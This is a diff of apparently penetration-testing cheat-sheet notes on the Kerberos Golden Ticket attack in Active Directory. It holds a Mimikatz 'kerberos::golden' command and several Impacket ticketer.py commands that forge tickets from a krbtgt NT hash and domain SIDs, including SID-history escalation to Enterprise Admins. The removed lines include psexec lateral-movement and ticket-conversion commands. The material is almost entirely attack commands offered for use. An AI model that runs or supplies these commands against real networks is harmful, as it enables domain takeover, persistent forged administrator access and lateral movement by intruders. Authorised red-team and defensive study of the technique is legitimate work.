@@ -4,7 +4,12 @@ Requires krbtgt password or NTLM hash, to forge a TGT.
 once you have hash for krbtgt
 Rewrite TGTs
 
-impacket ticketer.py
+impacket-ticketer
+
+Requirements:
+* KRBTGT hash
+
+---
 
 ## Get info - Mimikatz
 ```
@@ -21,18 +26,7 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 kerberos::tgt
 ```
 
-## Swapping tickets between Linux-Windows
-`python ticket_converter.py <LINUX.ccache> <WINDOWS.kirbi>`
-`python ticket_converter.py <WINDOWS.kirbi> <LINUX.ccache>`
-
 ## Alternatively you can use ticketer from Impacket
 `ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da`
 `ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519`
 `ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519`
-
-```
-export KRB5CCNAME=/home/user/ticket.ccache
-cat $KRB5CCNAME
-```
-
-`psexec.py -k -no-pass -dc-ip <IP> AD/administrator@192.168.1.100`
